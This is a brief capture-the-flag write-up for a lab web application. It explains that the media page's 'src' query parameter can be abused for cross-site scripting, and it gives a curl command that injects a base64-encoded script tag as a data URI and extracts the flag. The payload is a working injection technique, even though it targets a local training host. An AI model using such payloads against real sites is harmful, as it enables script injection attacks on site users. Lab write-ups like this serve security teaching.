# Exploit 10 - Media page XSS

On the _media_ page, the image source attribute is managed by the _src_ query parameter. We can leverage that to inject a script tag in place of a suitable image source.

```bash
curl -s -X GET "http://192.168.56.101/index.php?page=media&src=data:text/html;base64,$(echo "<script>alert('')</script>" | base64)" | grep -oP 'The flag is : \K[0-9a-f]{64}'
```
